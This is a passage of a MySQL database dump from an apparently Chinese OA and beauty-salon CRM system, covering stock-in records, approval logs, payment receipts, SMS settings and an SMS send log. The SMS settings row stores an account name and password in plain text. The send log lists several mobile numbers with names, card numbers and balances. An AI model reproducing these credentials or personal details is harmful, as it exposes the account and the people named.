(1, 16, '王晓丹', '2015-07-14 10:59:28', 0, '', '0000-00-00 00:00:00', 1, '', 'VVV', '2015-07-10 10:53:14', 0, '尺寸这种', 'V型成吧vc', '在啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧', '', 1436842746, '等待处理');

-- --------------------------------------------------------

--
-- 表的结构 `xy_ruku`
--

CREATE TABLE IF NOT EXISTS `xy_ruku` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(50) NOT NULL,
  `type` varchar(200) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `title` varchar(500) NOT NULL,
  `shijian` date NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='入库记录' AUTO_INCREMENT=32 ;

--
-- 转存表中的数据 `xy_ruku`
--

INSERT INTO `xy_ruku` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `bianhao`, `type`, `shuliang`, `title`, `shijian`, `jingban`, `shenheren`, `shenhe`) VALUES
(1, 1, '陈高明', '2015-06-02 09:33:34', 0, '', '0000-00-00 00:00:00', 1, '1506020001', '购买', 25, '加密狗,小票打印机', '2015-06-02', '陈高明', '陈高明', '审核通过'),
(2, 1, '陈高明', '2015-06-02 09:35:46', 0, '', '0000-00-00 00:00:00', 1, '1506020002', '自主开发', 4000, '客户管理管理系统,美容院管理系统', '2015-06-02', '陈高明', '陈高明', '审核通过'),
(19, 16, '王晓丹', '2015-07-05 11:17:42', 0, '', '0000-00-00 00:00:00', 1, '150705420010', '111', 0, '客户管理管理系统', '2015-07-07', '王晓丹', '陈高明', '审核通过'),
(18, 16, '王晓丹', '2015-07-05 11:17:21', 0, '', '0000-00-00 00:00:00', 1, '150705210009', '11', 0, '美容院管理系统,', '2015-07-21', '王晓丹', '王晓丹', '审核通过'),
(17, 16, '王晓丹', '2015-07-05 07:30:02', 0, '', '0000-00-00 00:00:00', 1, '150705020008', '任务', 0, '美容院管理系统', '2015-07-08', '王晓丹', '王晓丹', '审核通过'),
(16, 16, '王晓丹', '2015-07-02 19:05:15', 16, '王晓丹', '2015-07-05 07:32:35', 1, '150702150007', 'yt ', 10, '', '2015-07-15', '王晓丹', '陈高明', '审核通过'),
(15, 16, '王晓丹', '2015-06-29 01:15:00', 0, '', '0000-00-00 00:00:00', 1, '150629000006', '1', 2, '美容院管理系统', '2015-06-29', '王晓丹', '王晓丹', '审核通过'),
(14, 16, '王晓丹', '2015-06-29 01:13:02', 16, '王晓丹', '2015-06-29 01:13:45', 1, '150629020005', '1', 109, '美容院管理系统,', '2015-06-29', '王晓丹', '', '等待审核'),
(13, 1, '陈高明', '2015-06-07 13:06:25', 1, '陈高明', '2015-06-07 13:21:46', 1, '150607250004', '退货', 15, '加密狗,小票打印机', '2015-06-07', '陈高明', '王晓丹', '审核通过'),
(12, 1, '陈高明', '2015-06-07 12:49:58', 16, '王晓丹', '2015-06-25 23:12:53', 1, '150607580003', '购买', 10, '加密狗', '2015-06-07', '王晓丹', '王晓丹', '审核通过'),
(20, 1, '陈高明', '2015-07-07 14:33:34', 1, '陈高明', '2015-07-07 14:36:09', 1, '150707340011', '11', -401173504, '', '2015-07-07', '陈高明', '陈高明', '审核通过'),
(31, 16, '王晓丹', '2015-08-14 20:22:03', 0, '', '0000-00-00 00:00:00', 1, '150814030021', '1111', 0, 'd,美容院管理系统,小票打印机,客户管理管理系统', '2015-08-14', '王晓丹', '', '等待审核'),
(22, 1, '陈高明', '2015-07-11 15:53:34', 0, '', '0000-00-00 00:00:00', 1, '150711340013', '111', 0, '美容院管理系统,小票打印机', '2015-07-11', '陈高明', '陈高明', '审核通过'),
(23, 1, '陈高明', '2015-07-11 17:33:30', 0, '', '0000-00-00 00:00:00', 1, '150711300014', '111', 0, '美容院管理系统,加密狗,小票打印机,,,,,,,,,,,,', '2015-07-13', '陈高明', '陈高明', '审核通过'),
(24, 1, '陈高明', '2015-07-11 18:16:32', 0, '', '0000-00-00 00:00:00', 1, '150711320015', '1111', 0, '美容院管理系统', '2015-07-15', '陈高明', '', '等待审核'),
(25, 1, '陈高明', '2015-07-11 18:25:30', 0, '', '0000-00-00 00:00:00', 1, '150711300016', '1111', 0, '美容院管理系统,小票打印机', '2015-07-21', '陈高明', '', '等待审核'),
(26, 1, '陈高明', '2015-07-12 23:11:19', 0, '', '0000-00-00 00:00:00', 1, '150712190017', '2454', 0, '美容院管理系统', '2015-07-20', '陈高明', '陈高明', '审核通过'),
(27, 1, '陈高明', '2015-07-13 00:19:47', 0, '', '0000-00-00 00:00:00', 1, '150713470018', '4444', 0, ',美容院管理系统,客户管理管理系统,,,,,客户管理管理系统,客户管理管理系统,,,,,,,,,,,,加密狗,,客户管理管理系统,客户管理管理系统', '2015-07-14', '陈高明', '陈高明', '审核通过'),
(28, 1, '陈高明', '2015-07-13 00:21:51', 0, '', '0000-00-00 00:00:00', 1, '150713510019', '111', 0, '加密狗,客户管理管理系统', '2015-07-16', '陈高明', '', '等待审核'),
(29, 16, '王晓丹', '2015-07-14 11:00:47', 0, '', '0000-00-00 00:00:00', 1, '150714470020', '擦擦擦擦擦擦擦', 0, '', '2015-07-16', '王晓丹', '', '等待审核'),
(30, 16, '王晓丹', '2015-07-20 09:46:58', 0, '', '0000-00-00 00:00:00', 1, '150720580021', '广州', 0, '美容院管理系统,小票打印机', '2015-07-20', '王晓丹', '王晓丹', '退回修改');

-- --------------------------------------------------------

--
-- 表的结构 `xy_rukus`
--

CREATE TABLE IF NOT EXISTS `xy_rukus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(100) NOT NULL,
  `title` varchar(200) NOT NULL,
  `type` varchar(255) NOT NULL,
  `danwei` varchar(20) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `xid` int(11) NOT NULL,
  `edit` tinyint(1) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shijian` date NOT NULL,
  `fenlei` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='入库明细表' AUTO_INCREMENT=81 ;

--
-- 转存表中的数据 `xy_rukus`
--

INSERT INTO `xy_rukus` (`id`, `status`, `bianhao`, `title`, `type`, `danwei`, `shuliang`, `beizhu`, `shenhe`, `xid`, `edit`, `jingban`, `shijian`, `fenlei`) VALUES
(1, 1, 'jmg01', '加密狗', '62K', '只', 20, '一套软件配一个', '审核通过', 1, 0, '陈高明', '2015-06-02', '软件配套'),
(2, 1, 'sfz01', '小票打印机', '热敏纸', '台', 5, '配热敏纸5卷', '审核通过', 1, 0, '陈高明', '2015-06-02', '软件配套'),
(3, 1, 'crm', '客户管理管理系统', '通用的可以适当定制', '套', 2000, '', '审核通过', 2, 0, '陈高明', '2015-06-02', '软件服务'),
(4, 1, 'CRM01', '美容院管理系统', '通用', '套', 2000, '', '审核通过', 2, 0, '陈高明', '2015-06-02', '软件服务'),
(25, 1, 'crm', '客户管理管理系统', '通用的可以适当定制', '套', 0, '', '审核通过', 19, 0, '王晓丹', '2015-07-07', '软件服务'),
(22, 1, 'CRM01', '美容院管理系统', '通用', '套', 0, '', '审核通过', 17, 0, '王晓丹', '2015-07-08', '软件服务'),
(23, 1, 'CRM01', '美容院管理系统', '通用', '套', 0, '', '审核通过', 18, 0, '王晓丹', '2015-07-21', '软件服务'),
(51, 1, 'crm', '客户管理管理系统', '通用的可以适当定制', '套', 0, '', '审核通过', 27, 0, '陈高明', '2015-07-14', '软件服务'),
(17, 1, 'jmg01', '加密狗', '62K', '只', 5, '', '审核通过', 13, 0, '陈高明', '2015-06-07', '软件配套'),
(15, 1, 'jmg01', '加密狗', '62K', '只', 10, '', '审核通过', 12, 1, '王晓丹', '2015-06-07', '软件配套'),
(16, 1, 'sfz01', '小票打印机', '热敏纸', '台', 10, '', '审核通过', 13, 0, '陈高明', '2015-06-07', '软件配套'),
(28, 1, 'CRM01', '美容院管理系统', '通用', '套', 0, '', '审核通过', 22, 0, '陈高明', '2015-07-11', '软件服务'),
(29, 1, 'sfz01', '小票打印机', '热敏纸', '台', 0, '', '审核通过', 22, 0, '陈高明', '2015-07-11', '软件配套'),
(30, 1, 'CRM01', '美容院管理系统', '通用', '套', 0, '', '审核通过', 23, 0, '陈高明', '2015-07-13', '软件服务'),
(31, 1, 'jmg01', '加密狗', '62K', '只', 0, '', '审核通过', 23, 0, '陈高明', '2015-07-13', '软件配套'),
(32, 1, 'sfz01', '小票打印机', '热敏纸', '台', 0, '', '审核通过', 23, 0, '陈高明', '2015-07-13', '软件配套'),
(50, 1, 'CRM01', '美容院管理系统', '通用', '套', 0, '', '审核通过', 27, 0, '陈高明', '2015-07-14', '软件服务'),
(48, 1, 'CRM01', '美容院管理系统', '通用', '套', 0, '', '审核通过', 26, 0, '陈高明', '2015-07-20', '软件服务'),
(56, 1, 'crm', '客户管理管理系统', '通用的可以适当定制', '套', 0, '', '审核通过', 27, 0, '陈高明', '2015-07-14', '软件服务'),
(57, 1, 'crm', '客户管理管理系统', '通用的可以适当定制', '套', 0, '', '审核通过', 27, 0, '陈高明', '2015-07-14', '软件服务'),
(77, 1, 'd', 'd', '', '套', 0, '', '等待审核', 31, 0, '王晓丹', '2015-08-14', '软件服务'),
(78, 1, 'CRM01', '美容院管理系统', '通用', '套', 0, '', '等待审核', 31, 0, '王晓丹', '2015-08-14', '软件服务'),
(79, 1, 'sfz01', '小票打印机', '热敏纸', '台', 0, '', '等待审核', 31, 0, '王晓丹', '2015-08-14', '软件配套'),
(80, 1, 'crm', '客户管理管理系统', '通用的可以适当定制', '套', 0, '', '等待审核', 31, 0, '王晓丹', '2015-08-14', '软件服务'),
(69, 1, 'jmg01', '加密狗', '62K', '只', 0, '', '审核通过', 27, 0, '陈高明', '2015-07-14', '软件配套'),
(71, 1, 'crm', '客户管理管理系统', '通用的可以适当定制', '套', 0, '', '审核通过', 27, 0, '陈高明', '2015-07-14', '软件服务'),
(72, 1, 'crm', '客户管理管理系统', '通用的可以适当定制', '套', 0, '', '审核通过', 27, 0, '陈高明', '2015-07-14', '软件服务'),
(73, 1, 'jmg01', '加密狗', '62K', '只', 0, '', '等待审核', 28, 0, '陈高明', '2015-07-16', '软件配套'),
(74, 1, 'crm', '客户管理管理系统', '通用的可以适当定制', '套', 0, '', '等待审核', 28, 0, '陈高明', '2015-07-16', '软件服务'),
(75, 1, 'CRM01', '美容院管理系统', '通用', '套', 0, '', '等待审核', 30, 0, '王晓丹', '2015-07-20', '软件服务'),
(76, 1, 'sfz01', '小票打印机', '热敏纸', '台', 0, '', '等待审核', 30, 0, '王晓丹', '2015-07-20', '软件配套');

-- --------------------------------------------------------

--
-- 表的结构 `xy_shenhe`
--

CREATE TABLE IF NOT EXISTS `xy_shenhe` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `type` varchar(50) NOT NULL,
  `title` varchar(50) NOT NULL,
  `content` varchar(255) NOT NULL,
  `xid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='审核记录' AUTO_INCREMENT=26 ;

--
-- 转存表中的数据 `xy_shenhe`
--

INSERT INTO `xy_shenhe` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `type`, `title`, `content`, `xid`) VALUES
(1, 1, '陈高明', '2015-07-08 16:47:09', 0, '', '0000-00-00 00:00:00', 1, 'Ruku', '审核通过', '', 21),
(25, 16, '王晓丹', '2015-08-04 13:55:05', 0, '', '0000-00-00 00:00:00', 1, 'Shou', '退回修改', '', 8),
(24, 16, '王晓丹', '2015-08-03 13:50:34', 0, '', '0000-00-00 00:00:00', 1, 'Ruku', '审核通过', '', 15),
(5, 1, '陈高明', '2015-07-08 17:28:58', 0, '', '0000-00-00 00:00:00', 1, 'Shou', '退回修改', '', 6),
(6, 1, '陈高明', '2015-07-09 10:32:02', 0, '', '0000-00-00 00:00:00', 1, 'Shou', '审核通过', '', 6),
(7, 1, '陈高明', '2015-07-09 13:04:24', 0, '', '0000-00-00 00:00:00', 1, 'Chuku', '审核通过', '', 3),
(8, 1, '陈高明', '2015-07-11 17:22:33', 0, '', '0000-00-00 00:00:00', 1, 'Ruku', '退回修改', '', 16),
(9, 1, '陈高明', '2015-07-11 17:23:00', 0, '', '0000-00-00 00:00:00', 1, 'Ruku', '退回修改', '', 16),
(10, 1, '陈高明', '2015-07-11 17:23:06', 0, '', '0000-00-00 00:00:00', 1, 'Ruku', '审核通过', '', 16),
(11, 1, '陈高明', '2015-07-11 17:35:20', 0, '', '0000-00-00 00:00:00', 1, 'Ruku', '审核通过', '', 23),
(12, 1, '陈高明', '2015-07-11 17:35:38', 0, '', '0000-00-00 00:00:00', 1, 'Ruku', '审核通过', '', 22),
(13, 1, '陈高明', '2015-07-11 18:20:00', 0, '', '0000-00-00 00:00:00', 1, 'Hetong', '审核通过', '', 12),
(14, 1, '陈高明', '2015-07-11 18:45:30', 0, '', '0000-00-00 00:00:00', 1, 'Hetong', '退回修改', '', 13),
(15, 1, '陈高明', '2015-07-11 18:46:35', 0, '', '0000-00-00 00:00:00', 1, 'Hetong', '审核通过', '', 13),
(16, 1, '陈高明', '2015-07-12 23:11:37', 0, '', '0000-00-00 00:00:00', 1, 'Ruku', '审核通过', '', 26),
(17, 1, '陈高明', '2015-07-13 00:20:31', 0, '', '0000-00-00 00:00:00', 1, 'Ruku', '审核通过', '', 27),
(18, 1, '陈高明', '2015-07-13 00:26:42', 0, '', '0000-00-00 00:00:00', 1, 'Hetong', '审核通过', '', 14),
(19, 1, '陈高明', '2015-07-13 13:43:33', 0, '', '0000-00-00 00:00:00', 1, 'Hetong', '审核通过', '', 15),
(20, 16, '王晓丹', '2015-07-20 00:07:14', 0, '', '0000-00-00 00:00:00', 1, 'Fukuan', '审核通过', '', 3),
(21, 16, '王晓丹', '2015-07-20 09:47:58', 0, '', '0000-00-00 00:00:00', 1, 'Ruku', '退回修改', '', 30),
(22, 1, '陈高明', '2015-07-23 17:13:02', 0, '', '0000-00-00 00:00:00', 1, 'Chuku', '审核通过', 'ok', 4),
(23, 1, '陈高明', '2015-07-23 17:13:09', 0, '', '0000-00-00 00:00:00', 1, 'Chuku', '审核通过', 'ok', 4);

-- --------------------------------------------------------

--
-- 表的结构 `xy_shou`
--

CREATE TABLE IF NOT EXISTS `xy_shou` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `title` varchar(200) NOT NULL,
  `bianhao` varchar(100) NOT NULL,
  `type` varchar(50) NOT NULL,
  `jine` int(11) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `attid` int(11) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  `mingcheng` varchar(200) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='收款记录' AUTO_INCREMENT=9 ;

--
-- 转存表中的数据 `xy_shou`
--

INSERT INTO `xy_shou` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `hid`, `title`, `bianhao`, `type`, `jine`, `jingban`, `beizhu`, `attid`, `shenhe`, `shenheren`, `mingcheng`) VALUES
(1, 1, '陈高明', '2015-06-02 09:53:59', 0, '', '0000-00-00 00:00:00', 1, 1, '百度公司', '1506020001', '公司账号', 5000, '陈高明', '预付款', 1433210020, '审核通过', '陈高明', 'CRM管理系统'),
(2, 1, '陈高明', '2015-06-02 10:17:46', 0, '', '0000-00-00 00:00:00', 1, 2, '深圳腾讯公司', '1506020002', '公司账号', 8850, '王旭东', '一次性付款', 1433211434, '审核通过', '陈高明', '美容院管理系统安装版'),
(5, 16, '王晓丹', '2015-07-05 04:18:20', 0, '', '0000-00-00 00:00:00', 1, 11, '1', '150616280005', '公司账号', 100, '', '', 1436041055, '审核通过', '王晓丹', '33333'),
(8, 16, '王晓丹', '2015-08-04 13:54:18', 16, '王晓丹', '2015-08-12 14:05:49', 1, 13, '南昌房屋中介服务', '150711440007', '公司账号', 99, '', 'ddddddddd', 1438667609, '退回修改', '王晓丹', '11'),
(6, 1, '陈高明', '2015-07-08 17:28:09', 0, '', '0000-00-00 00:00:00', 1, 12, '', '150708060006', '公司账号', 100, '', '', 1436347067, '审核通过', '陈高明', '111');

-- --------------------------------------------------------

--
-- 表的结构 `xy_sms`
--

CREATE TABLE IF NOT EXISTS `xy_sms` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(50) NOT NULL,
  `dianhua` varchar(50) NOT NULL,
  `url` varchar(255) NOT NULL,
  `yzm` varchar(50) NOT NULL,
  `yue` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='短信管理' AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `xy_sms`
--

INSERT INTO `xy_sms` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `title`, `dianhua`, `url`, `yzm`, `yue`, `name`) VALUES
(1, 1, '陈高明', '2015-05-19 11:39:49', 1, '陈高明', '2015-07-06 09:22:42', 1, '信友科技', '13812349563', '127.0.0.1', '123456789a', 1109, 'liuxing99');

-- --------------------------------------------------------

--
-- 表的结构 `xy_smscz`
--

CREATE TABLE IF NOT EXISTS `xy_smscz` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `cid` int(11) NOT NULL,
  `title` varchar(50) NOT NULL,
  `jine` int(11) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='短信充值' AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `xy_smscz`
--

INSERT INTO `xy_smscz` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `cid`, `title`, `jine`, `shuliang`, `beizhu`) VALUES
(2, 1, '陈高明', '2015-05-31 22:03:40', 0, '', '0000-00-00 00:00:00', 1, 1, '信友科技', 1, 10, '10'),
(3, 1, '陈高明', '2015-06-16 12:20:54', 0, '', '0000-00-00 00:00:00', 1, 1, '信友科技', 100, 1250, '充值');

-- --------------------------------------------------------

--
-- 表的结构 `xy_smsfs`
--

CREATE TABLE IF NOT EXISTS `xy_smsfs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `addtime` datetime NOT NULL,
  `jieguo` varchar(100) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `cid` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `content` varchar(255) NOT NULL,
  `ip` varchar(50) NOT NULL,
  `url` varchar(200) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='发送记录' AUTO_INCREMENT=165 ;

--
-- 转存表中的数据 `xy_smsfs`
--

INSERT INTO `xy_smsfs` (`id`, `addtime`, `jieguo`, `status`, `cid`, `name`, `phone`, `content`, `ip`, `url`) VALUES
(1, '2015-05-19 16:34:39', '成功', 1, 1, 'liuxing99', '18951251872', '【OA】验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(2, '2015-05-19 16:36:13', '成功', 1, 1, 'liuxing99', '18951251872', '【OA】验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(3, '2015-05-19 16:36:39', '成功', 1, 1, 'liuxing99', '18951251872', '【OA】验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(4, '2015-05-19 17:24:50', '成功', 1, 1, 'liuxing99', '18951251872', '【OA】验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(5, '2015-05-19 17:24:53', '成功', 1, 1, 'liuxing99', '18951251872', '【OA】验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(6, '2015-05-19 19:50:32', '成功', 1, 1, 'liuxing99', '18951251872', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(7, '2015-05-19 19:51:38', '成功', 1, 1, 'liuxing99', '18951251872', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(8, '2015-05-19 19:52:49', '成功', 1, 1, 'liuxing99', '18951250018', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(9, '2015-05-19 19:52:50', '成功', 1, 1, 'liuxing99', '18951250018', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(10, '2015-05-19 19:55:21', '成功', 1, 1, 'liuxing99', '18951250018', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(11, '2015-05-19 19:56:19', '成功', 1, 1, 'liuxing99', '13812349563', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(12, '2015-05-19 19:56:21', '成功', 1, 1, 'liuxing99', '13812349563', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(13, '2015-05-19 19:58:19', '成功', 1, 1, 'liuxing99', '18951251872', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(14, '2015-05-31 22:00:57', '成功', 1, 1, 'liuxing99', '13812349563', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(15, '2015-05-31 22:01:10', '成功', 1, 1, 'liuxing99', '18951251872', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(16, '2015-06-03 09:58:53', '成功', 1, 1, 'liuxing99', '13812349563', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home'),
(17, '2015-06-16 10:10:43', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】恭喜您成为本店会员,级别:普通会员,卡号:666666卡余额:500.00', '127.0.0.1', '/mms/index.php?m=Home'),
(18, '2015-06-16 13:13:50', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】尊敬的客户:恭喜您的卡号:666666于2015-06-16 13:17:33次卡消费成功,次卡余额1,卡余额:0.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home'),
(19, '2015-06-16 13:21:30', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】尊敬的客户:恭喜您的卡号:666666于2015-06-16 13:17:33次卡消费成功,次卡余额1,卡余额:0.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home'),
(20, '2015-06-16 13:48:04', '成功', 1, 1, 'liuxing99', '13812349563', '【OA】尊敬的客户：恭喜您！您于{Time}成为本店会员，会员卡号为{CardID}，感谢您的光临！', '127.0.0.1', '/weboa/index.php?m=Home'),
(21, '2015-06-16 14:27:23', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】尊敬的客户:恭喜您的卡号:888888于2015-06-16 14:31:33充值100,卡余额:3306.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(22, '2015-06-16 14:29:05', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】尊敬的客户:恭喜您的卡号:666666于2015-06-16 14:33:15商品消费950,卡余额:150.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(23, '2015-06-16 14:33:37', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】尊敬的客户:恭喜您的卡号:于2015-06-16 14:37:47消费撤单-950.00,卡余额:1100.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Xiaofei&a=chedan'),
(24, '2015-06-16 14:36:22', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-16 14:40:32积分增加50,积分余额:215 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Duihuan&a=biandongok'),
(25, '2015-06-16 14:39:16', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-16 14:43:26次卡消费成功,次卡余额0,卡余额:1100.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiciok'),
(26, '2015-06-16 14:46:13', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-16 14:50:23由普通会员调整为银卡会员 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(27, '2015-06-16 14:46:14', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-16 14:50:24商品消费1900,卡余额:0.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(28, '2015-06-16 14:49:36', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】尊敬的客户:恭喜您的卡号:666666于2015-06-16 14:53:46充次卡,次卡余额20,卡余额:0.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(29, '2015-06-16 14:53:00', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】尊敬的客户:恭喜您的卡号:888888于2015-06-16 14:57:09充值1010,卡余额:4316.00 魅力无限美容院解放路总店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(30, '2015-06-16 14:53:57', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】尊敬的客户:恭喜您的卡号:18961314946于2015-06-16 14:58:07充值1010,卡余额:1205.00 魅力无限美容院解放路总店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(31, '2015-06-16 14:54:36', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】尊敬的客户:恭喜您的卡号:666666于2015-06-16 14:58:46充值1100,卡余额:1100.00 魅力无限美容院解放路总店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(32, '2015-06-17 17:52:12', '成功', 1, 1, 'liuxing99', '18205134946', '【CRM】尊敬的客户:恭喜您于2015-06-17 18:01:31成为本店会员,级别:普通会员,卡号:18205134946,卡余额:1000.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(33, '2015-06-17 17:58:18', '成功', 1, 1, 'liuxing99', '18205134946', '【CRM】尊敬的客户:您的卡号:18205134946于2015-06-17 18:07:42商品消费665,卡余额:335.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(34, '2015-06-17 18:03:49', '成功', 1, 1, 'liuxing99', '18205134946', '【CRM】尊敬的客户:您的卡号:18205134946于2015-06-17 18:13:14充值3200,卡余额:3535.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(35, '2015-06-17 18:05:58', '成功', 1, 1, 'liuxing99', '18205134946', '【CRM】尊敬的客户:您的卡号:18205134946于2015-06-17 18:15:22由普通会员调整为银卡会员 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
(36, '2015-06-17 18:05:59', '成功', 1, 1, 'liuxing99', '18205134946', '【CRM】尊敬的客户:您的卡号:18205134946于2015-06-17 18:15:23充次卡,次卡余额8,卡余额:1464.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Ka&a=chongciok'),
